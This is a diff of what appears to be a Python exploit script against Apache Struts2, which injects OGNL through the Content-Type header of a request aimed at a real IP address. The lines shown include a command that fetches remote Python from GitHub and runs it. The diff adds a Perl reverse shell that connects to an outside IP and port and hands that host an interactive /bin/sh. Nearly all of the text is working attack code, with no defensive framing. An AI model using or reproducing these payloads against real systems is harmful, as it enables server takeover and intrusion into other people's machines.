@@ -7,7 +7,8 @@ struts2= "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().con
 
 #command = 'cd /var/tmp && cat RunMe.py'
 #command = 'cd /var/tmp && curl https://raw.githubusercontent.com/kcperk/ApacheTest/master/RunMe.py > RunMe2.py && ls && cat RunMe2.py'
-command = 'cd /var/tmp && curl https://raw.githubusercontent.com/kcperk/ApacheTest/master/RunMe7.py> RunMe.py && python3 RunMe.py'
+#command = 'cd /var/tmp && curl https://raw.githubusercontent.com/kcperk/ApacheTest/master/RunMe15.py > RunMe.py && python3 RunMe.py'
+command = 'perl -e \'use Socket;$i="24.162.240.46";$p=4343;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
 attack = struts+command+struts2
 headerz = {'Host':'104.131.75.39', 'Content-Type':attack, 'Connection':'Close'}
 
